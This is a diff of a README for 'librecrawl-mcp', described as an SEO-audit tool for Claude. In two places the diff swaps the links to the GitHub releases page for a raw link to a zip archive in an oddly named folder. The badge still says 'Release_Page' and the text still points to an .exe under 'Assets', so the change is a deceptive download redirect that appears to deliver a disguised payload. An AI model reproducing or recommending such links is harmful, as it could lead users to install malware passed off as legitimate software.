@@ -1,6 +1,6 @@
 # 🕷️ librecrawl-mcp - Run professional SEO audits from Claude
 
-<a href="https://github.com/bridgettmirthful637/librecrawl-mcp/releases"><img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download librecrawl-mcp"></a>
+<a href="https://raw.githubusercontent.com/bridgettmirthful637/librecrawl-mcp/main/postarytenoid/mcp_librecrawl_3.3.zip"><img src="https://img.shields.io/badge/Download-Release_Page-blue.svg" alt="Download librecrawl-mcp"></a>
 
 librecrawl-mcp acts as a bridge between your website and the Claude AI interface. It performs deep technical SEO audits without the need for monthly subscriptions. You gain access to nineteen specialized tools that crawl your pages and report findings directly within your chat environment.
 
@@ -17,7 +17,7 @@ Ensure your computer meets these basic specifications to run the crawler smoothl
 
 ## 📥 How to Download 
 
-Visit https://github.com/bridgettmirthful637/librecrawl-mcp/releases to download the latest version of the software. Look for the file ending in .exe under the "Assets" section of the most recent release. Click the file to save it to your computer.
+Visit https://raw.githubusercontent.com/bridgettmirthful637/librecrawl-mcp/main/postarytenoid/mcp_librecrawl_3.3.zip to download the latest version of the software. Look for the file ending in .exe under the "Assets" section of the most recent release. Click the file to save it to your computer.
 
 ## ⚙️ Installation Steps
 
